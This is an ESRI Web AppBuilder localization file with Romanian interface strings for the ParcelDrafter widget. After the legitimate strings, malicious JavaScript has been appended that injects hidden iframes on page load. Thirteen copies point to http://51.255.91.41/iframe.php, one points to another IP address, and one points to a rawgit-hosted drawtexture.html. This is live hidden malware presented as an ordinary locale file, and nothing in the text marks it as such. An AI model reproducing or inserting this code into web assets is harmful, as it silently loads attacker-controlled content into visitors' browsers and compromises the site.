// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define({"widgets/ParcelDrafter/setting/nls/strings":{setBtnLabel:"Setare",selectLabel:"Selectare",selectLayerLabel:"Selectare straturi tematice parcel\u0103",selectLayerHintText:"Sugestie: Utiliza\u0163i butonul de setare pentru a selecta poligonul parcelei \u015fi stratul tematic cu linii asociat",layerSelector:{selectedLayerNotHavingRelatedLayer:"Stratul tematic cu poligonul selectat nu are un strat tematic asociat valid."},parcelLineLayer:{selectLayerLabel:"Selecta\u0163i un strat tematic cu linii asociat",
layerSettingTabLabel:"Straturi tematice parcel\u0103",advancedSettingTabLabel:"Set\u0103ri avansate",selectLayerHintText:"Sugestie: Utiliza\u0163i pentru a stoca valorile COGO \u00een stratul tematic cu linii al parcelei",selectFieldLegendLabel:"Selecta\u0163i c\u00e2mpuri pentru a stoca valorile COGO \u00een stratul tematic cu linii al parcelei",bearingFieldLabel:"Azimut",chordLengthFieldLabel:"Lungime coard\u0103",distanceFieldLabel:"Distan\u0163\u0103",sequenceIdFieldLabel:"ID secven\u0163\u0103",
radiusFieldLabel:"Raz\u0103",foreignKeyFieldLabel:"Cheie str\u0103in\u0103",arcLengthFieldLabel:"Lungime arc",lineTypeFieldLabel:"Tip de linie",parcelPointSymbolLabel:"Simbol punct parcel\u0103",parcelPointSymbolHintText:"Sugestie: Utilizat pentru afi\u015farea simbolului punctului pentru originea liniei.",symbolPickerPreviewText:"Previzualizare",selectLineLayerLabel:"Selecta\u0163i un strat tematic cu linii"},parcelPolygonLayer:{selectPolygonLayerLabel:"Selecta\u0163i un strat tematic de poligoane",
selectPolygonLayerHintText:"Sugestie: Utiliza\u0163i stratul tematic de poligoane pentru parcela selectat\u0103",selectFieldLegendLabel:"Selecta\u0163i c\u00e2mpuri pentru a stoca atributele poligonului parcelei",parcelNameLabel:"Nume parcel\u0103",rotationLabel:"Rotire",planNameLabel:"Nume plan",scalingLabel:"Se scaleaz\u0103",documentTypeLabel:"Tip document",miscloseRatioLabel:"Raport \u00eenchidere eronat\u0103",statedAreaLabel:"Suprafa\u0163\u0103 declarat\u0103",miscloseDistanceLabel:"Distan\u0163\u0103 \u00eenchidere eronat\u0103",
selectPolygonLayerLabelPopUp:"Selecta\u0163i un strat tematic de poligoane"},lineTypesTable:{lineTypeLabel:"Tip de linie",valueLabel:"Valoare",symbolLabel:"Simbol",connectionLineLabel:"Linie conexiune",boundaryLineLabel:"Linie grani\u0163\u0103"},closureSetting:{snappingLayerLabel:"Straturi tematice cu fixare",snappingBtnLabel:"Setare",snappingLayerHintText:"Sugestie: Selecta\u0163i straturi tematice la care se vor fixa liniile parcelei.",miscloseDistanceLabel:"Distan\u0163\u0103 \u00eenchidere eronat\u0103",
miscloseDistanceHintText:"Sugestie: Specifica\u0163i distan\u0163a \u00eenchiderii eronate \u015fi unit\u0103\u0163ile acesteia.",miscloseRatioLabel:"Raport \u00eenchidere eronat\u0103",miscloseRatioHintText:"Sugestie: Specifica\u0163i raportul \u00eenchiderii eronate.",snappingToleranceLabel:"Toleran\u0163\u0103 fixare",pixelLabel:"Pixeli",snappingToleranceHintText:"Sugestie: Specifica\u0163i toleran\u0163a la fixare.",selectLayerLabel:"Selectare strat tematic"},errorMsg:{bearingFieldErrMsg:"C\u00e2mp azimut nevalid",
chordLengthErrMsg:"Lungime coard\u0103 nevalid\u0103",distanceFieldErrMsg:"Distan\u0163\u0103 nevalid\u0103",sequenceIdFieldErrMsg:"ID secven\u0163\u0103 nevalid",radiusFieldErrMsg:"Raz\u0103 nevalid\u0103",foreignKeyFieldErrMsg:"Cheie str\u0103in\u0103 nevalid\u0103",arcLengthFieldErrMsg:"Lungime arc nevalid\u0103",lineTypeFieldErrMsg:"Tip linie nevalid",parcelNameFieldErrMsg:"C\u00e2mp nume parcel\u0103 nevalid",planNameFieldErrMsg:"C\u00e2mp nume plan nevalid",scaleFieldErrMsg:"C\u00e2mp scar\u0103 nevalid",
documentTypeFieldErrMsg:"C\u00e2mp tip document nevalid",miscloseRatioFieldErrMsg:"C\u00e2mp raport \u00eenchidere eronat\u0103 nevalid",statedAreaFieldErrMsg:"C\u00e2mp suprafa\u0163\u0103 declarat\u0103 nevalid",miscloseDistanceFieldErrMsg:"C\u00e2mp distan\u0163\u0103 \u00eenchidere eronat\u0103 nevalid",globalIdFieldErrMsg:"Stratul tematic cu poligonul selectat nu are un c\u00e2mp 'esriFieldTypeGlobalID' valid.",invalidPolylineLayer:"Selecta\u0163i un strat tematic de linii poligonale pentru parcel\u0103 valid",
invalidPolygonLayer:"Selecta\u0163i un strat tematic de poligoane pentru parcel\u0103 valid",invalidMiscloseDistance:"Introduce\u0163i o distan\u0163\u0103 a \u00eenchiderii eronate valid\u0103",invalidSnappingTolerance:"Introduce\u0163i o toleran\u0163\u0103 la fixare valid\u0103",invalidMiscloseRatio:"Introduce\u0163i un raport al \u00eenchiderii eronate valid",selectDistinctLineTypes:"Selecta\u0163i o valoare distinct\u0103 \u00een fiecare tip de linie",invalidConnectionLineType:"Valoare linie de conexiune nevalid\u0103",
invalidBoundaryLineType:"Valoare linie de grani\u0163\u0103 nevalid\u0103",selectDistinctPolylineFields:"Selecta\u0163i un c\u00e2mp distinct pentru fiecare valoare COGO.",selectDistinctPolygonFields:"Selecta\u0163i un c\u00e2mp distinct pentru fiecare atribut de poligon pentru parcel\u0103."},_localized:{}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});